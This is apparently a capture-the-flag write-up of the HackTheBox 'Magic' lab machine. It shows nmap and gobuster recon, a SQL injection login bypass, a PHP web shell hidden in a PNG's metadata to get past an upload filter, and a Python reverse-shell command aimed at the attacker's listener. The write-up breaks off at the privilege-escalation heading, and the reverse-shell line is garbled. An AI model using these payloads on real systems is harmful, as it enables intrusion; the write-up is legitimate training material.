# Recon
```
sudo nmap -sV -p- -sC -oN nmap.txt -O 10.10.10.185 -T5
```
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Magic/assets/1.png">

We discover two open ports and see that the target is running Linux. Browsing to the webserver on port 80 shows us an image upload page. We can try to gain initial foothold by uploading a reverse script. This will bropably be blocked by a filter but we can try to bypass this.

# Enumeration
We find a link to a login page. Let's first try to run gobuster in an attempt to find folders and files which could lead us to usernames and other info. We also check to see if there's a robots.txt file which can contain usefull folders.

We'll run two gobuster scans. One for file discovery and one for folders.
```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.10.185 -x txt
gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.10.185
```
Other than three folders (```/assets /images /server-status```) we don't find anything interesting.

Because we will probably try to upload shell code to our target for initial access it is important to know where the files will be uploaded. Therefor we will run another gobuster scan on the ```/images``` directory.

We've found an ```/uploads``` folder. This might be usefull later on.

# Initial Foothold
 Next we'll try some default usernames and passwords but without any luck. One thing we didn't try was if we could use SQL injection to bypass the login screen. That seems to work as we are now logged in and able to upload images.

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Magic/assets/2.png">

There is a filter blocking other filetypes than JPG, JPEG and PNG files. Let's fire up BurSuite to see if we can intercept the request and change it to our liking. Let's rename a JPEG file to .jpeg.php and intercept the request. We did the exact same thing eralier on the Popcorn box.

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Magic/assets/4.png">

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Magic/assets/3.png">

That didn't seem to work because there is another filter blocking our attempt. This will probably be a check for file signatures. These signatures are known as magic numbers or Magic Bytes. For PNG files these are ```89 50 4E 47 0D 0A 1A 0A```. We can however add some code to a genuine PNG file in an attempt to bypass this signature filter.

We well use ```exiftools``` for this:
```
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' exploit.php.png 
```
The file was successfully uploaded. We can now try to see if we can run commands by browsing to it's location and a simple ```list``` command. We know this locations because of the earlier found ```/uploads``` directory.

```
http://10.10.10.185/images/uploads/exploit.php.png?cmd=ls
```

That worked!

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Magic/assets/5.png">

We can now alter the command to spawn a reverse shell. We'll use the Python code from the Pentestmonkey Cheat Sheet.

```
http://10.10.10.185/images/uploads/exploit.php.png?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.6",4444))](http://10.10.10.185/images/uploads/exploit.php.png?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.14.6%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27)
```
With our listener ready on port 4444 we now have a low priviliged reverse shell:

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Magic/assets/6.png">

# Privilege Escalation